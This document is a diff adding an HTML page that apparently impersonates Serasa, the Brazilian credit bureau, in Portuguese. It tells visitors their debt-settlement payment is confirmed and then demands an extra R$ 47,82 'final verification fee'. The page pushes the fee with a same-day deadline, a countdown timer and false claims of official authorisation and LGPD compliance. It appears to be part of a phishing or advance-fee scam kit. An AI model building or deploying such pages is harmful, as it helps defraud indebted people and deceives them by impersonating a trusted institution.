@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+    <title>Validação Final do Atendimento - Serasa</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+</head>
+<body>
+    <!-- Cabeçalho -->
+    <header class="header">
+        <div class="ecs-container container--medium">
+            <button type="button" class="ea-button ea-button--ghost headerHamburguer ht-cta" href="#">
+                <div class="icon iconHamburguer">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" stroke="#000000" width="28" height="28">
+                        <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                        <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+                        <g id="SVGRepo_iconCarrier">
+                            <path d="M4 18L20 18" stroke="#ffffff" stroke-width="2" stroke-linecap="round"></path>
+                            <path d="M4 12L20 12" stroke="#ffffff" stroke-width="2" stroke-linecap="round"></path>
+                            <path d="M4 6L20 6" stroke="#ffffff" stroke-width="2" stroke-linecap="round"></path>
+                        </g>
+                    </svg>
+                </div>
+                <span>Menu</span>
+            </button>
+            <a href="#" aria-label="Ir para página principal Serasa" class="headerLogo logo-serasa">
+                <img id="serasa" name="Serasa" aria-hidden="true" alt="Ir para Home" src="images/logo.svg" width="160" height="36">
+            </a>
+            <a href="#" class="ea-button ea-button--ghost ht-cta" aria-label="Ir para página de login da Serasa" role="button">
+                <i class="user icon epp-14i7jac eklzmbx0" aria-hidden="true">
+                    <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" width="28" height="28">
+                        <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                        <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+                        <g id="SVGRepo_iconCarrier">
+                            <path d="M8 7C9.65685 7 11 5.65685 11 4C11 2.34315 9.65685 1 8 1C6.34315 1 5 2.34315 5 4C5 5.65685 6.34315 7 8 7Z" fill="#ffffff"></path>
+                            <path d="M14 12C14 10.3431 12.6569 9 11 9H5C3.34315 9 2 10.3431 2 12V15H14V12Z" fill="#ffffff"></path>
+                        </g>
+                    </svg>
+                </i>
+                Entrar
+            </a>
+        </div>
+    </header>
+
+    <!-- Conteúdo Principal -->
+    <main class="main-content">
+        <div class="upsell-container">
+            <div class="verification-card">
+                <div class="verification-header">
+                    <h1>Validação Final do Atendimento</h1>
+                    <div class="success-subtitle">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Pagamento do seu acordo foi confirmado com sucesso!</span>
+                    </div>
+                    <div class="process-description">
+                        <p>Para dar continuidade ao processo e liberar sua regularização total, conclua a etapa de verificação abaixo:</p>
+                    </div>
+                    
+                    <div class="urgency-alert">
+                        <div class="urgency-text">
+                            <i class="fas fa-clock"></i>
+                            <span id="urgencyMessage">⏰ Essa verificação está disponível apenas até hoje às 23h59.</span>
+                        </div>
+                        <div class="countdown-timer">
+                            <span>Tempo restante: </span>
+                            <span id="timeRemaining">--:--:--</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="price-section">
+                    <div class="price-label">Taxa de Verificação Final</div>
+                    <div class="price-value">R$ 47,82</div>
+                    <div class="price-description">
+                        <p>Esse valor garante a autenticação do seu atendimento, emissão de comprovantes e conclusão do processo de baixa de dívidas.</p>
+                    </div>
+                </div>
+
+                <p class="confianca">
+                    <i class="fas fa-lock"></i>
+                    Atendimento verificado por sistema oficial autorizado.
+                </p>
+
+                <div class="action-buttons">
+                    <button class="btn btn-primary" id="payBtn">
+                        <i class="fas fa-shield-check"></i>
+                        Efetuar Verificação
+                    </button>
+                </div>
+
+                <ul class="garantias">
+                    <li><i class="fas fa-lock"></i> Verificação 100% segura</li>
+                    <li><i class="fas fa-file-contract"></i> Emissão automática do comprovante</li>
+                    <li><i class="fas fa-shield-alt"></i> Atendimento autenticado conforme LGPD</li>
+                </ul>
+            </div>
+        </div>
+    </main>
+
+    <script src="script.js"></script>
+</body>
+</html> 
